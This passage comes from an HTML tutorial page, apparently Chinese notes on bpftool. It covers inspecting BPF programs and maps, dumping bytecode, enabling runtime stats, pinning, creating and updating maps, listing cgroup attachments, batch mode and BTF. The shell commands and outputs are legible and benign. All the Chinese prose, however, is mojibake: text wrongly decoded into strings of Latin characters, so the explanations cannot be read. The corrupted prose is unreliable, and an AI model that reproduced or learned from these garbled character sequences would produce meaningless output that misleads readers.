åˆ°å‰é¢çš„å‘½ä»¤ä¸­ï¼š<code>bpftool prog show id 52</code>ã€‚è¿™æ ·ï¼ŒBPFToolå°†æ˜¾ç¤ºä½ ä¹‹å‰çœ‹åˆ°çš„ç›¸åŒä¿¡æ¯ï¼Œä½†ä»…é’ˆå¯¹ç”±ID 52æ ‡è¯†çš„ç¨‹åºï¼› è¿™æ ·å¯ä»¥è¿‡æ»¤æ‰ä½ ä¸éœ€è¦çš„ä¿¡æ¯ã€‚ æ­¤å‘½ä»¤è¿˜æ”¯æŒ<code>--json</code>æ ‡å¿—æ¥ç”Ÿæˆä¸€äº›JSONè¾“å‡ºã€‚å¦‚æœä½ æƒ³æ“ä½œè¾“å‡ºï¼Œè¿™ä¸ªJSONè¾“å‡ºéå¸¸æ–¹ä¾¿ã€‚ä¾‹å¦‚ï¼Œåƒ<code>jq</code>è¿™æ ·çš„å·¥å…·ä¼šä¸ºä½ æä¾›æ›´ç»“æ„åŒ–çš„æ•°æ®æ ¼å¼ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> bpftool prog show --json id 52 | jq</span></span><br><span class="line"> &#123;</span><br><span class="line">  "id": 52,</span><br><span class="line">  "type": "cgroup_skb",</span><br><span class="line">  "tag": "7be49e3934a125ba",</span><br><span class="line">  "gpl_compatible": false,</span><br><span class="line">  "loaded_at": 1553816764,</span><br><span class="line">  "uid": 0,</span><br><span class="line">  "bytes_xlated": 296,</span><br><span class="line">  "jited": true,</span><br><span class="line">  "bytes_jited": 229,</span><br><span class="line">  "bytes_memlock": 4096,</span><br><span class="line">  "map_ids": [</span><br><span class="line">  52,</span><br><span class="line">  53</span><br><span class="line">  ] </span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>å½“ä½ çŸ¥é“ç¨‹åºæ ‡è¯†ç¬¦æ—¶ï¼Œä½ è¿˜å¯ä»¥ä½¿ç”¨BPFToolè·å–æ•´ä¸ªç¨‹åºçš„è½¬å‚¨ï¼›å½“ä½ éœ€è¦è°ƒè¯•ç¼–è¯‘å™¨ç”Ÿæˆçš„BPFå­—èŠ‚ç æ—¶ï¼Œè¿™ä¼šå¾ˆæ–¹ä¾¿ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> bpftool prog dump xlated id 52</span></span><br><span class="line">       0: (bf) r6 = r1</span><br><span class="line">       1: (69) r7 = *(u16 *)(r6 +192)</span><br><span class="line">       2: (b4) w8 = 0</span><br><span class="line">       3: (55) if r7 != 0x8 goto pc+14</span><br><span class="line">       4: (bf) r1 = r6</span><br><span class="line">       5: (b4) w2 = 16</span><br><span class="line">       6: (bf) r3 = r10</span><br><span class="line">       7: (07) r3 += -4</span><br><span class="line">       8: (b4) w4 = 4</span><br><span class="line">       9: (85) call bpf_skb_load_bytes#7151872</span><br><span class="line">       ...</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªç”±<code>Systemd</code>åŠ è½½åˆ°æˆ‘ä»¬å†…æ ¸ä¸­çš„ç¨‹åºæ­£åœ¨ä½¿ç”¨å¸®åŠ©ç¨‹åº<code>bpf_skb_load_bytes</code>æ£€æŸ¥æ•°æ®åŒ…æ•°æ®ã€‚</p><p>å¦‚æœä½ æƒ³è¦è¿™ä¸ªç¨‹åºæ›´ç›´è§‚çš„è¡¨ç¤ºï¼ŒåŒ…æ‹¬æŒ‡ä»¤è·³è½¬ï¼Œä½ å¯ä»¥åœ¨è¿™ä¸ªå‘½ä»¤ä¸­ä½¿ç”¨<code>visual</code>å…³é”®å­—ã€‚ è¿™å°†ç”Ÿæˆä¸€ç§æ ¼å¼åŒ–çš„è¾“å‡ºï¼Œä½ å¯ä»¥ä½¿ç”¨<code>dot</code>ä¹‹ç±»çš„å·¥å…·æˆ–ä»»ä½•å…¶ä»–å¯ä»¥ç»˜åˆ¶å›¾å½¢çš„ç¨‹åºå°†å…¶è½¬æ¢ä¸ºå›¾å½¢è¡¨ç¤ºï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> bpftool prog dump xlated id 52 visual &amp;&gt; output.out</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> dot -Tpng output.out -o visual-graph.png</span></span><br></pre></td></tr></table></figure><p>å¦‚æœä½ è¿è¡Œçš„æ˜¯<code>5.1</code>æˆ–æ›´æ–°ç‰ˆæœ¬çš„å†…æ ¸ï¼Œè¿˜å¯ä»¥è®¿é—®è¿è¡Œæ—¶ç»Ÿè®¡ä¿¡æ¯ã€‚å®ƒä»¬å‘Šè¯‰ä½ å†…æ ¸åœ¨ä½ çš„BPFç¨‹åºä¸ŠèŠ±è´¹äº†å¤šé•¿æ—¶é—´ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œç³»ç»Ÿä¸­å¯èƒ½æœªå¯ç”¨æ­¤åŠŸèƒ½ï¼›ä½ éœ€è¦å…ˆè¿è¡Œè¿™ä¸ªå‘½ä»¤ï¼Œè®©å†…æ ¸çŸ¥é“å®ƒéœ€è¦å‘ä½ å±•ç¤ºè¿™äº›æ•°æ®ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> sysctl -w kernel.bpf_stats_enabled=1</span></span><br></pre></td></tr></table></figure><p>å¯ç”¨ç»Ÿè®¡ä¿¡æ¯åï¼Œä½ å°†åœ¨è¿è¡ŒBPFToolæ—¶è·å¾—å¦å¤–ä¸¤æ¡ä¿¡æ¯ï¼šå†…æ ¸è¿è¡Œè¯¥ç¨‹åºæ‰€èŠ±è´¹çš„æ€»æ—¶é—´<code>(run_time_ns)</code>ï¼Œä»¥åŠè¿è¡Œè¯¥ç¨‹åºçš„æ¬¡æ•°<code>(run_cnt)</code>ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">52: cgroup_skb  tag 7be49e3934a125ba  run_time_ns 14397 run_cnt 39</span><br><span class="line">     loaded_at 2019-03-28T16:46:04-0700  uid 0</span><br><span class="line">     xlated 296B  jited 229B  memlock 4096B  map_ids 52,53</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯BPFToolä¸ä»…å…è®¸ä½ æ£€æŸ¥ç¨‹åºçš„è¿è¡Œæƒ…å†µï¼›å®ƒè¿˜å…è®¸ä½ å°†æ–°ç¨‹åºåŠ è½½åˆ°å†…æ ¸ä¸­å¹¶å°†å…¶ä¸­ä¸€äº›é™„åŠ åˆ°å¥—æ¥å­—å’Œ <code>cgroup</code>ã€‚ ä¾‹å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥åŠ è½½æˆ‘ä»¬ä»¥å‰çš„ç¨‹åºä¹‹ä¸€å¹¶å°†å…¶å›ºå®šåˆ°BPFæ–‡ä»¶ç³»ç»Ÿï¼Œä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt1]# bpftool prog load bpf_program.o /sys/fs/bpf/bpf_prog</span><br><span class="line">[root@VM-16-14-centos cpt1]# bpftool prog show</span><br><span class="line">254: tracepoint  name bpf_prog  tag c6e8e35bea53af79  gpl</span><br><span class="line">loaded_at 2022-05-28T17:06:14+0800  uid 0</span><br><span class="line">xlated 112B  jited 76B  memlock 4096B  map_ids 43</span><br></pre></td></tr></table></figure><h5 id="æ£€æŸ¥BPFæ˜ å°„"><a href="#æ£€æŸ¥BPFæ˜ å°„" class="headerlink" title="æ£€æŸ¥BPFæ˜ å°„"></a>æ£€æŸ¥BPFæ˜ å°„</h5><p>é™¤äº†å…è®¸æ£€æŸ¥å’Œæ“ä½œBPFç¨‹åºä¹‹å¤–ï¼ŒBPFToolè¿˜å¯ä»¥è®©æ‚¨è®¿é—®è¿™äº›ç¨‹åºæ­£åœ¨ä½¿ç”¨çš„BPFæ˜ å°„ã€‚ åˆ—å‡ºæ‰€æœ‰æ˜ å°„å¹¶æŒ‰å…¶æ ‡è¯†ç¬¦è¿‡æ»¤æ˜ å°„çš„å‘½ä»¤ï¼Œç±»ä¼¼ä¹‹å‰çœ‹åˆ°çš„showå‘½ä»¤ã€‚ é™¤äº†è®©BPFToolæ˜¾ç¤ºprogçš„ä¿¡æ¯ï¼Œè¿˜å¯ä»¥æ˜¾ç¤ºmapçš„ä¿¡æ¯ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> bpftool map show</span></span><br><span class="line">    52: lpm_trie  flags 0x1</span><br><span class="line">            key 8B  value 8B  max_entries 1  memlock 4096B</span><br><span class="line">    53: lpm_trie  flags 0x1</span><br><span class="line">            key 20B  value 8B  max_entries 1  memlock 4096B</span><br><span class="line">    54: lpm_trie  flags 0x1</span><br><span class="line">            key 8B  value 8B  max_entries 1  memlock 4096B</span><br><span class="line">    55: lpm_trie  flags 0x1</span><br><span class="line">            key 20B  value 8B  max_entries 1  memlock 4096B</span><br></pre></td></tr></table></figure><p>è¿™äº›æ˜ å°„ä¸ä¹‹å‰çœ‹åˆ°çš„é™„åŠ åˆ°ç¨‹åºçš„æ ‡è¯†ç¬¦ç›¸åŒ¹é…ã€‚è¿˜å¯ä»¥æŒ‰IDè¿‡æ»¤æ˜ å°„ã€‚</p><p>ä½ å¯ä»¥ä½¿ç”¨BPFToolåˆ›å»ºå’Œæ›´æ–°æ˜ å°„å¹¶åˆ—å‡ºæ˜ å°„ä¸­çš„æ‰€æœ‰å…ƒç´ ã€‚åˆ›å»ºæ–°æ˜ å°„æ‰€éœ€çš„ä¿¡æ¯ä¸ä½ åœ¨åˆå§‹åŒ–æ˜ å°„æ—¶æä¾›çš„ä¿¡æ¯ç›¸åŒã€‚æˆ‘ä»¬éœ€è¦æŒ‡å®šè¦åˆ›å»ºçš„æ˜ å°„ç±»å‹ã€é”®å’Œå€¼çš„å¤§å°åŠå…¶åç§°ã€‚å› ä¸ºæˆ‘ä»¬æ²¡æœ‰å°†æ˜ å°„ä¸ç¨‹åºä¸€èµ·åˆå§‹åŒ–ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜éœ€è¦å°†å®ƒå›ºå®šåˆ°BPFæ–‡ä»¶ç³»ç»Ÿï¼Œä»¥ä¾¿æˆ‘ä»¬ä»¥åå¯ä»¥ä½¿ç”¨å®ƒï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos bpf]# bpftool map create /sys/fs/bpf/counter type array key 4 value 4 entries 5 name counter</span><br></pre></td></tr></table></figure><p>å¦‚æœåœ¨è¿è¡Œè¯¥å‘½ä»¤ååˆ—å‡ºç³»ç»Ÿä¸­çš„æ˜ å°„ï¼Œå°†åœ¨åˆ—è¡¨åº•éƒ¨çœ‹åˆ°æ–°æ˜ å°„ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos bpf]# bpftool map</span><br><span class="line">1: array  flags 0x0</span><br><span class="line">key 4B  value 4B  max_entries 100  memlock 4096B</span><br><span class="line">45: array  name counter  flags 0x0</span><br><span class="line">key 4B  value 4B  max_entries 5  memlock 4096B</span><br></pre></td></tr></table></figure><p>åˆ›å»ºæ˜ å°„åå¯ä»¥åƒåœ¨BPFç¨‹åºä¸­é‚£æ ·æ›´æ–°å’Œåˆ é™¤å…ƒç´ ã€‚</p><p>å¦‚æœè¦å‘æ˜ å°„æ·»åŠ æ–°å…ƒç´ æˆ–æ›´æ–°ç°æœ‰å…ƒç´ ï¼Œå¯ä»¥ä½¿ç”¨æ˜ å°„æ›´æ–°å‘½ä»¤ã€‚ä½ å¯ä»¥ä»å‰é¢çš„ç¤ºä¾‹ä¸­è·å–æ˜ å°„æ ‡è¯†ç¬¦ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos bpf]# bpftool map update id 45 key 1 0 0 0 value 1 0 0 0</span><br></pre></td></tr></table></figure><p>å¦‚æœä½ å°è¯•ä½¿ç”¨æ— æ•ˆçš„é”®æˆ–å€¼æ›´æ–°å…ƒç´ ï¼ŒBPFToolå°†è¿”å›é”™è¯¯ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos bpf]# bpftool map update id 45 key 1 0 0 0 value 1 0 0</span><br><span class="line">Error: value expected 4 bytes got 3</span><br></pre></td></tr></table></figure><p>å¦‚æœéœ€è¦æ£€æŸ¥å…¶å€¼ï¼ŒBPFToolå¯ä»¥æä¾›æ˜ å°„ä¸­æ‰€æœ‰å…ƒç´ çš„è½¬å‚¨ã€‚åœ¨åˆ›å»ºå›ºå®šå¤§å°çš„æ•°ç»„æ˜ å°„æ—¶ï¼Œå¯ä»¥çœ‹åˆ°BPFå¦‚ä½•å°†æ‰€æœ‰å…ƒç´ åˆå§‹åŒ–ä¸ºç©ºå€¼ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos bpf]# bpftool map dump id 45</span><br><span class="line">key: 00 00 00 00  value: 00 00 00 00</span><br><span class="line">key: 01 00 00 00  value: 01 00 00 00</span><br><span class="line">key: 02 00 00 00  value: 00 00 00 00</span><br><span class="line">key: 03 00 00 00  value: 00 00 00 00</span><br><span class="line">key: 04 00 00 00  value: 00 00 00 00</span><br><span class="line">Found 5 elements</span><br></pre></td></tr></table></figure><p>BPFToolæä¾›çš„æœ€å¼ºå¤§çš„é€‰é¡¹ä¹‹ä¸€æ˜¯ï¼Œä½ å¯ä»¥å°†é¢„å…ˆåˆ›å»ºçš„æ˜ å°„é™„åŠ åˆ°æ–°ç¨‹åºï¼Œå¹¶ç”¨è¿™äº›é¢„å…ˆåˆ†é…çš„æ˜ å°„æ›¿æ¢å®ƒä»¬åˆå§‹åŒ–çš„æ˜ å°„ã€‚è¿™æ ·ä½ å¯ä»¥ä»ä¸€å¼€å§‹å°±è®©ç¨‹åºè®¿é—®ä¿å­˜çš„æ•°æ®ï¼Œå³ä½¿ä½ æ²¡æœ‰ç¼–å†™ç¨‹åºæ¥ä»BPFæ–‡ä»¶ç³»ç»Ÿè¯»å–æ˜ å°„ã€‚ ä¸ºæ­¤ï¼Œä½ éœ€è¦åœ¨ä½¿ç”¨BPFToolåŠ è½½ç¨‹åºæ—¶è®¾ç½®è¦åˆå§‹åŒ–çš„æ˜ å°„ã€‚å¯ä»¥é€šè¿‡ç¨‹åºåŠ è½½å®ƒæ—¶çš„æœ‰åºæ ‡è¯†ç¬¦æ¥æŒ‡å®šæ˜ å°„ï¼Œä¾‹å¦‚ï¼Œ0è¡¨ç¤ºç¬¬ä¸€ä¸ªæ˜ å°„ï¼Œ1è¡¨ç¤ºç¬¬äºŒä¸ªæ˜ å°„ï¼Œä¾æ­¤ç±»æ¨ã€‚è¿˜å¯ä»¥é€šè¿‡åç§°æŒ‡å®šæ˜ å°„ï¼Œè¿™é€šå¸¸æ›´æ–¹ä¾¿ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt1]# bpftool prog load bpf_program.o /sys/fs/bpf/bpf_prog_2         map name counter pinned /sys/fs/bpf/counter</span><br></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬å°†åˆšåˆšåˆ›å»ºçš„æ˜ å°„é™„åŠ åˆ°ä¸€ä¸ªæ–°ç¨‹åºä¸­ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å°†æ˜ å°„æ›¿æ¢ä¸ºå®ƒçš„åç§°ï¼Œå› ä¸ºæˆ‘ä»¬çŸ¥é“ç¨‹åºåˆå§‹åŒ–äº†ä¸€ä¸ªåä¸ºcounterçš„æ˜ å°„ã€‚ ä½ è¿˜å¯ä»¥ä½¿ç”¨å…³é”®å­—<code>idx</code>ä½¿ç”¨æ˜ å°„çš„ç´¢å¼•ä½ç½®ï¼Œå¦‚<code>idx 0</code>ã€‚</p><p>å½“æ‚¨éœ€è¦å®æ—¶è°ƒè¯•æ¶ˆæ¯ä¼ é€’æ—¶ï¼Œç›´æ¥ä»å‘½ä»¤è¡Œè®¿é—®BPFæ˜ å°„å¾ˆæœ‰ç”¨ã€‚ BPFToolè®©ä½ ä»¥ä¸€ç§æ›´æ–¹ä¾¿çš„æ–¹å¼ç›´æ¥è®¿é—®ã€‚ é™¤äº†è‡ªçœç¨‹åºå’Œæ˜ å°„ä¹‹å¤–ï¼Œä½ è¿˜å¯ä»¥ä½¿ç”¨BPFToolä»å†…æ ¸ä¸­æå–æ›´å¤šä¿¡æ¯ã€‚ æ¥ä¸‹æ¥è®©æˆ‘ä»¬çœ‹çœ‹å¦‚ä½•è®¿é—®ç‰¹å®šçš„æ¥å£ã€‚</p><h5 id="æ£€æŸ¥é™„ç€åˆ°ç‰¹å®šæ¥å£çš„ç¨‹åº"><a href="#æ£€æŸ¥é™„ç€åˆ°ç‰¹å®šæ¥å£çš„ç¨‹åº" class="headerlink" title="æ£€æŸ¥é™„ç€åˆ°ç‰¹å®šæ¥å£çš„ç¨‹åº"></a>æ£€æŸ¥é™„ç€åˆ°ç‰¹å®šæ¥å£çš„ç¨‹åº</h5><p>æœ‰æ—¶ä½ ä¼šå‘ç°è‡ªå·±æƒ³çŸ¥é“å“ªäº›ç¨‹åºé™„åŠ åˆ°ç‰¹å®šæ¥å£ã€‚BPF å¯ä»¥åŠ è½½åœ¨<code>cgroup</code>ã€<code>Perf</code>äº‹ä»¶å’Œç½‘ç»œæ•°æ®åŒ…ä¹‹ä¸Šå·¥ä½œçš„ç¨‹åºã€‚å­å‘½ä»¤<code>cgroupã€perf å’Œ net</code>å¯ä»¥å¸®åŠ©ä½ è¿½æº¯è¿™äº›æ¥å£ä¸Šçš„é™„ç€ç¨‹åºã€‚</p><p><code>perf</code>å­å‘½ä»¤åˆ—å‡ºæ‰€æœ‰é™„åŠ åˆ°ç³»ç»Ÿä¸­è·Ÿè¸ªç‚¹çš„ç¨‹åºï¼Œå¦‚<code>kprobesã€uprobeså’Œtracepoints</code>ï¼› ä½ å¯ä»¥é€šè¿‡è¿è¡Œ <code>bpftool perf show</code>æ¥æŸ¥çœ‹è¯¥åˆ—è¡¨ã€‚</p><p><code>net</code>å­å‘½ä»¤åˆ—å‡ºäº†é™„åŠ åˆ°XDPå’ŒTraffic Controlçš„ç¨‹åºã€‚å…¶ä»–é™„ç€ç¨‹åºï¼Œå¦‚å¥—æ¥å­—è¿‡æ»¤å™¨å’Œé‡ç”¨ç«¯å£ç¨‹åºï¼Œåªèƒ½é€šè¿‡ä½¿ç”¨<code>iproute2</code>è®¿é—®ã€‚ æ‚¨å¯ä»¥ä½¿ç”¨<code>bpftool net show</code>åˆ—å‡ºXDPå’ŒTCçš„é™„ç€ç¨‹åºï¼Œå°±åƒåœ¨å…¶ä»–BPFå¯¹è±¡ä¸­çœ‹åˆ°çš„ä¸€æ ·ã€‚</p><p>æœ€åï¼Œ<code>cgroup</code>å­å‘½ä»¤åˆ—å‡ºæ‰€æœ‰é™„åŠ åˆ°<code>cgroup</code>çš„ç¨‹åºã€‚ è¿™ä¸ªå­å‘½ä»¤ä¸ä½ çœ‹åˆ°çš„å…¶ä»–å‘½ä»¤æœ‰äº›ä¸åŒã€‚<code>bpftool cgroup show</code>éœ€è¦ä½ æ£€æŸ¥çš„<code>cgroup</code>è·¯å¾„ã€‚å¦‚æœè¦åˆ—å‡ºç³»ç»Ÿä¸­æ‰€æœ‰<code>cgroup</code>ä¸­çš„æ‰€æœ‰é™„ç€ç¨‹åºï¼Œåˆ™éœ€è¦ä½¿ç”¨<code>bpftool cgroup tree</code>ï¼Œå¦‚ä¸‹ä¾‹æ‰€ç¤ºï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> bpftool cgroup tree</span></span><br><span class="line">    CgroupPath</span><br><span class="line">    ID       AttachType      AttachFlags     Name</span><br><span class="line">    /sys/fs/cgroup/unified/system.slice/systemd-udevd.service</span><br><span class="line">5 ingress</span><br><span class="line">        4        egress</span><br><span class="line">    /sys/fs/cgroup/unified/system.slice/systemd-journald.service</span><br><span class="line">3 ingress</span><br><span class="line">        2        egress</span><br><span class="line">    /sys/fs/cgroup/unified/system.slice/systemd-logind.service</span><br><span class="line">        7        ingress</span><br><span class="line">        6        egress</span><br></pre></td></tr></table></figure><p>è‡³æ­¤ï¼Œæˆ‘ä»¬å·²ç»è®¨è®ºäº†å¦‚ä½•åœ¨ç»ˆç«¯ä¸­è¾“å…¥ä¸åŒçš„å‘½ä»¤æ¥è°ƒè¯•BPFç¨‹åºã€‚ä½†æ˜¯ï¼Œå½“ä½ æœ€éœ€è¦è¿™äº›å‘½ä»¤æ—¶ï¼Œè®°ä½æ‰€æœ‰è¿™äº›å‘½ä»¤å¯èƒ½ä¼šå¾ˆéº»çƒ¦ã€‚æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°†æè¿°å¦‚ä½•ä»çº¯æ–‡æœ¬æ–‡ä»¶åŠ è½½å‡ ä¸ªå‘½ä»¤ï¼Œä»¥ä¾¿ä½ å¯ä»¥æ„å»ºä¸€ç»„æ–¹ä¾¿ä½¿ç”¨çš„è„šæœ¬ã€‚</p><h5 id="åœ¨æ‰¹å¤„ç†æ¨¡å¼ä¸‹åŠ è½½å‘½ä»¤"><a href="#åœ¨æ‰¹å¤„ç†æ¨¡å¼ä¸‹åŠ è½½å‘½ä»¤" class="headerlink" title="åœ¨æ‰¹å¤„ç†æ¨¡å¼ä¸‹åŠ è½½å‘½ä»¤"></a>åœ¨æ‰¹å¤„ç†æ¨¡å¼ä¸‹åŠ è½½å‘½ä»¤</h5><p>å½“ä½ å°è¯•åˆ†æä¸€ä¸ªæˆ–å¤šä¸ªç³»ç»Ÿçš„è¡Œä¸ºæ—¶ï¼Œç»å¸¸åå¤è¿è¡Œå¤šä¸ªå‘½ä»¤ã€‚æœ€ç»ˆå¯èƒ½ä¼šå¾—åˆ°ä¸€ç»„ç»å¸¸åœ¨å·¥å…·é“¾ä¸­ä½¿ç”¨çš„å‘½ä»¤ã€‚ å¦‚æœä½ ä¸æƒ³æ¯æ¬¡éƒ½è¾“å…¥è¿™äº›å‘½ä»¤ï¼ŒBPFToolçš„æ‰¹å¤„ç†æ¨¡å¼å°±å¾ˆé€‚åˆä½ ã€‚</p><p>ä½¿ç”¨æ‰¹å¤„ç†æ¨¡å¼å¯ä»¥å°†è¦æ‰§è¡Œçš„æ‰€æœ‰å‘½ä»¤å†™å…¥æ–‡ä»¶å¹¶ä¸€æ¬¡è¿è¡Œæ‰€æœ‰å‘½ä»¤ã€‚è¿˜å¯ä»¥é€šè¿‡ä»¥<code>#</code>å¼€å¤´çš„è¡Œåœ¨æ­¤æ–‡ä»¶ä¸­å†™å…¥æ³¨é‡Šã€‚ä½†æ˜¯ï¼Œè¿™ç§æ‰§è¡Œæ¨¡å¼ä¸æ˜¯åŸå­çš„ã€‚BPFToolé€è¡Œæ‰§è¡Œå‘½ä»¤ï¼Œå¦‚æœå…¶ä¸­ä¸€ä¸ªå‘½ä»¤å¤±è´¥ï¼Œå®ƒå°†ä¸­æ­¢æ‰§è¡Œï¼Œä½¿ç³»ç»Ÿå¤„äºè¿è¡Œæœ€æ–°æˆåŠŸå‘½ä»¤åçš„çŠ¶æ€ã€‚</p><p>ä»¥ä¸‹æ˜¯æ‰¹å¤„ç†æ¨¡å¼å¯ä»¥å¤„ç†çš„æ–‡ä»¶çš„ç®€çŸ­ç¤ºä¾‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> Create a new <span class="built_in">hash</span> map</span></span><br><span class="line">map create /sys/fs/bpf/hash_map type hash key 4 value 4 entries 5 name hash_map</span><br><span class="line"><span class="meta">#</span><span class="bash"> Now show all the maps <span class="keyword">in</span> the system</span></span><br><span class="line">map show</span><br></pre></td></tr></table></figure><p>å¦‚æœå°†è¿™äº›å‘½ä»¤ä¿å­˜åœ¨åä¸º<code>/tmp/batch_example.txt</code>çš„æ–‡ä»¶ä¸­ï¼Œåˆ™å¯ä»¥ä½¿ç”¨<code>bpftool batch file /tmp/batch_example.txt</code>åŠ è½½å®ƒã€‚ å½“ä½ ç¬¬ä¸€æ¬¡è¿è¡Œè¿™ä¸ªå‘½ä»¤æ—¶ï¼Œä½ ä¼šå¾—åˆ°ç±»ä¼¼äºä¸‹é¢çš„ä»£ç ç‰‡æ®µçš„è¾“å‡ºï¼Œä½†æ˜¯å¦‚æœä½ å†æ¬¡å°è¯•è¿è¡Œå®ƒï¼Œè¿™ä¸ªå‘½ä»¤å°†ä¼šé€€å‡ºå¹¶ä¸”æ²¡æœ‰è¾“å‡ºï¼Œå› ä¸ºæˆ‘ä»¬å·²ç»æœ‰ä¸€ä¸ªåä¸º<code>hash_map</code>çš„æ˜ å°„åœ¨ç³»ç»Ÿï¼Œå¹¶ä¸”æ‰¹å¤„ç†æ‰§è¡Œå°†åœ¨ç¬¬ä¸€è¡Œå¤±è´¥ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos tmp]# bpftool batch file /tmp/batch_example.txt</span><br><span class="line">46: array  name counter  flags 0x0</span><br><span class="line">key 4B  value 4B  max_entries 5  memlock 4096B</span><br><span class="line">51: hash  name hash_map  flags 0x0</span><br><span class="line">key 4B  value 4B  max_entries 5  memlock 4096B</span><br><span class="line">processed 2 commands</span><br></pre></td></tr></table></figure><h5 id="æ˜¾ç¤ºBTFä¿¡æ¯"><a href="#æ˜¾ç¤ºBTFä¿¡æ¯" class="headerlink" title="æ˜¾ç¤ºBTFä¿¡æ¯"></a>æ˜¾ç¤ºBTFä¿¡æ¯</h5><p>BPFToolå¯ä»¥æ˜¾ç¤ºä»»ä½•ç»™å®šäºŒè¿›åˆ¶å¯¹è±¡å­˜åœ¨çš„BPFç±»å‹æ ¼å¼(BTF)ä¿¡æ¯ã€‚BTFä½¿ç”¨å…ƒæ•°æ®ä¿¡æ¯å¯¹ç¨‹åºç»“æ„è¿›è¡Œæ³¨é‡Šï¼Œä»¥å¸®åŠ©ä½ è°ƒè¯•ç¨‹åºã€‚</p><p>ä¾‹å¦‚ï¼Œå½“ä½ å°†å…³é”®å­—<code>linum</code>æ·»åŠ åˆ°<code>prog dump</code>æ—¶ï¼Œå®ƒå¯ä»¥ä¸ºä½ æä¾›BPFç¨‹åºä¸­æ¯æ¡æŒ‡ä»¤çš„æºæ–‡ä»¶å’Œè¡Œå·ã€‚</p><p>BPFToolçš„æœ€æ–°ç‰ˆæœ¬åŒ…æ‹¬ä¸€ä¸ªæ–°çš„<code>btf</code>å­å‘½ä»¤ï¼Œå¸®åŠ©ä½ æ·±å…¥äº†è§£ç¨‹åºã€‚æ­¤å‘½ä»¤çš„åˆå§‹é‡ç‚¹æ˜¯å¯è§†åŒ–ç»“æ„ç±»å‹ã€‚ä¾‹å¦‚ï¼Œ<code>bpftool btf dump id 54</code>æ˜¾ç¤ºäº†IDä¸º54çš„ç¨‹åºçš„æ‰€æœ‰BTFç±»å‹ã€‚</p><h4 id="BPFTrace"><a href="#BPFTrace" class="headerlink" 